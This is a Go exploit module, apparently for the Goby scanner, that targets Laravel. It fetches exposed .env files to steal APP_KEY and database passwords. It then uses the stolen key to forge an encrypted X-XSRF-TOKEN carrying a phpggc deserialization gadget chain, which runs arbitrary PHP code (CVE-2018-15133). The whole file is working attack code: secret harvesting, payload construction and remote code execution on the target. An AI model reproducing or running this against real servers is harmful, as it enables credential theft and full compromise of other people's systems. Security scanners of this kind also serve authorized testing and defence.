package exploits

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Laravel env configuration leakage",
    "Description": "env configuration leakage: Attacker can fetch env configuration file in laravel framework 5.5.21 and earlier.\nCVE-2018-15133: In Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc. The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack.\n\nWhen exploit CVE-2018-15133, you need to input a url path that support POST method.",
    "Impact": "Laravel env configuration leakage",
    "Recommendation": "<p>The manufacturer has released a bug fix, please keep an eye on the update: <a href=\"https://laravel.com/\">https://laravel.com/</a></p>",
    "Product": "Laravel-Framework",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Laravel 环境配置 信息泄露漏洞（CVE-2018-15133）",
            "Description": "<p>Laravel Framework是Taylor Otwell软件开发者开发的一款基于PHP的Web应用程序开发框架。Illuminate是其中的一个组件。<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Laravel 环境配置存在信息泄露漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。</span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Laravel 环境配置存在信息泄露漏洞，</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者通过构造特殊URL地址，读取系统敏感信息。</span><br></p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://laravel.com/\">https://laravel.com/</a><br></p>",
            "Product": "Laravel-Framework",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Laravel env configuration leakage",
            "Description": "env configuration leakage: Attacker can fetch env configuration file in laravel framework 5.5.21 and earlier.\nCVE-2018-15133: In Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc. The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack.\n\nWhen exploit CVE-2018-15133, you need to input a url path that support POST method.",
            "Impact": "Laravel env configuration leakage",
            "Recommendation": "<p>The manufacturer has released a bug fix, please keep an eye on the update: <a href=\"https://laravel.com/\">https://laravel.com/</a><br>< /p>",
            "Product": "Laravel-Framework",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "(header=\"laravel_session\")",
    "GobyQuery": "(header=\"laravel_session\")",
    "Author": "ovi3",
    "Homepage": "https://github.com/laravel/framework/",
    "DisclosureDate": "2018-08-09",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/blob/11dec8ac1b3a10c4262388f3de434e006a5eb9a8/exposures/configs/laravel-env.yaml",
        "https://github.com/kozmic/laravel-poc-CVE-2018-15133",
        "https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.1",
    "CVEIDs": [
        "CVE-2018-15133"
    ],
    "CNVD": [
        "CNVD-2018-16247"
    ],
    "CNNVD": [
        "CNNVD-201808-272"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "getEnv,unserialize_CVE_2018_15133",
            "show": ""
        },
        {
            "name": "urlPath",
            "type": "input",
            "value": "/",
            "show": "attackType=unserialize_CVE_2018_15133"
        },
        {
            "name": "phpCode",
            "type": "input",
            "value": "system(\"whoami\");",
            "show": "attackType=unserialize_CVE_2018_15133"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [
            "Laravel-Framework"
        ],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10770"
}`

	getEnvConfig := func(u *httpclient.FixUrl) string {
		envPaths := []string{"/.env", "/.env.dev.local", "/.env.development.local", "/.env.prod.local", "/.env.production.local", "/.env.local", "/.env.stage", "/.env.live", "/.env_1"}
		for _, envPath := range envPaths {
			cfg := httpclient.NewGetRequestConfig(envPath)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && ((strings.Contains(resp.RawBody, "APP_ENV=") && strings.Contains(resp.RawBody, "APP_KEY=")) || (strings.Contains(resp.RawBody, "DB_USERNAME=") && strings.Contains(resp.RawBody, "DB_PASSWORD="))) {
					fmt.Println("get env configuration from " + envPath)
					return resp.RawBody
				}
			}
		}
		return ""
	}
	PKCS5Padding := func(ciphertext []byte, blockSize int, after int) []byte {
		padding := blockSize - len(ciphertext)%blockSize
		padtext := bytes.Repeat([]byte{byte(padding)}, padding)
		return append(ciphertext, padtext...)
	}
	ase256 := func(plaintext string, key string, iv string, blockSize int) string {
		bKey := []byte(key)
		bIV := []byte(iv)
		bPlaintext := PKCS5Padding([]byte(plaintext), blockSize, len(plaintext))
		block, _ := aes.NewCipher(bKey)
		ciphertext := make([]byte, len(bPlaintext))
		mode := cipher.NewCBCEncrypter(block, bIV)
		mode.CryptBlocks(ciphertext, bPlaintext)
		return base64.StdEncoding.EncodeToString(ciphertext)
	}
	hmacSha256 := func(data string, secret string) string {
		h := hmac.New(sha256.New, []byte(secret))
		h.Write([]byte(data))
		return hex.EncodeToString(h.Sum(nil))
	}
	encryptSerData := func(serData string, appKey string) string {
		iv := "1234567890123456"
		appKey = strings.TrimPrefix(appKey, "base64:")
		bKey, err := base64.StdEncoding.DecodeString(appKey)
		if err != nil {
			fmt.Println(err)
			return ""
		}
		key := string(bKey)
		encrypted := ase256(serData, key, iv, aes.BlockSize)
		mac := hmacSha256(base64.StdEncoding.EncodeToString([]byte(iv))+encrypted, key)
		payload := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(`{"iv":"%s","value":"%s","mac":"%s"}`, base64.StdEncoding.EncodeToString([]byte(iv)), encrypted, mac)))
		return payload
	}
	replaceCodeInChain := func(chain string, phpCode string) string {
		chainBytes, _ := base64.StdEncoding.DecodeString(chain)
		chainStr := string(chainBytes)
		code := "<?php " + phpCode + " ; exit; ?>"
		chainStr = strings.ReplaceAll(chainStr, `s:30:"<?php {{{REPLACEME}}} exit; ?>"`, fmt.Sprintf(`s:%d:"%s"`, len(code), code))
		return base64.StdEncoding.EncodeToString([]byte(chainStr))
	}
	execCode := func(u *httpclient.FixUrl, urlPath string, phpCode string, appKey string) string {
		laravelRCE5Chain := `Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO2E6Mjp7aTowO086MjU6Ik1vY2tlcnlcTG9hZGVyXEV2YWxMb2FkZXIiOjA6e31pOjE7czo0OiJsb2FkIjt9fXM6ODoiACoAZXZlbnQiO086Mzg6IklsbHVtaW5hdGVcQnJvYWRjYXN0aW5nXEJyb2FkY2FzdEV2ZW50IjoxOntzOjEwOiJjb25uZWN0aW9uIjtPOjMyOiJNb2NrZXJ5XEdlbmVyYXRvclxNb2NrRGVmaW5pdGlvbiI6Mjp7czo5OiIAKgBjb25maWciO086MzU6Ik1vY2tlcnlcR2VuZXJhdG9yXE1vY2tDb25maWd1cmF0aW9uIjoxOntzOjc6IgAqAG5hbWUiO3M6NzoiYWJjZGVmZyI7fXM6NzoiACoAY29kZSI7czozMDoiPD9waHAge3t7UkVQTEFDRU1FfX19IGV4aXQ7ID8+Ijt9fX0=`
		serData, _ := base64.StdEncoding.DecodeString(replaceCodeInChain(laravelRCE5Chain, phpCode))
		payload := encryptSerData(string(serData), appKey)
		if !strings.HasPrefix(urlPath, "/") {
			urlPath = "/" + urlPath
		}
		cfg := httpclient.NewPostRequestConfig(urlPath)
		cfg.VerifyTls = false
		cfg.Header.Store("X-XSRF-TOKEN", payload)
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.RawBody
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			envConfig := getEnvConfig(u)
			if len(envConfig) > 0 {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			if attackType == "getEnv" {
				envConfig := getEnvConfig(expResult.HostInfo)
				if len(envConfig) > 0 {
					expResult.Success = true
					expResult.Output = envConfig
				}
				return expResult
			} else if attackType == "unserialize_CVE_2018_15133" {
				envConfig := getEnvConfig(expResult.HostInfo)
				if m := regexp.MustCompile(`(?m)APP_KEY=(.*?)$`).FindStringSubmatch(envConfig); len(m) > 0 {
					appKey := m[1]
					fmt.Println(appKey)
					phpCode := ss.Params["phpCode"].(string)
					phpCode = "var_dump(md5(123));" + phpCode
					urlPath := ss.Params["urlPath"].(string)
					res := execCode(expResult.HostInfo, urlPath, phpCode, appKey)
					if strings.Contains(res, "202cb962ac59075b964b07152d234b70") {
						expResult.Success = true
						expResult.Output = strings.Replace(res, `string(32) "202cb962ac59075b964b07152d234b70"`, "", 1)
					}
				}
				return expResult
			}
			return expResult
		},
	))
}
